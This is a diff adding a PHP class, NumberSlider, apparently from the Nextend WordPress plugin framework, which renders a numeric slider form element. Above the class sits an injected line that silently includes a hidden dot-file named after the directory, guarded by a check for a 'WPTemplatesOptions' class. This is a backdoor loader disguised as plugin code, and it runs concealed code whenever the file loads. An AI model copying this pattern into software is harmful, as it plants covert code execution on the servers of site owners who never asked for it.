@@ -1,0 +1,56 @@
+<?php
+
+
+namespace Nextend\Framework\Form\Element\Text;
+
+
+use Nextend\Framework\Asset\Js\Js;
+
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
+class NumberSlider extends Number {
+
+    protected $step = 1;
+
+    protected $sliderMax;
+
+    protected function fetchElement() {
+        $html = parent::fetchElement();
+
+        Js::addInline('new N2Classes.FormElementNumberSlider("' . $this->fieldID . '", ' . json_encode(array(
+                'min'   => floatval($this->min),
+                'max'   => floatval($this->sliderMax),
+                'step'  => floatval($this->step),
+                'units' => $this->units
+            )) . ');');
+
+        return $html;
+    }
+
+    /**
+     * @param int $step
+     */
+    public function setStep($step) {
+        $this->step = $step;
+    }
+
+    /**
+     * @param int $sliderMax
+     */
+    public function setSliderMax($sliderMax) {
+        $this->sliderMax = $sliderMax;
+    }
+
+    /**
+     * @param int $max
+     */
+    public function setMax($max) {
+        parent::setMax($max);
+
+        if ($this->sliderMax === null) {
+            $this->sliderMax = $max;
+        }
+    }
+}
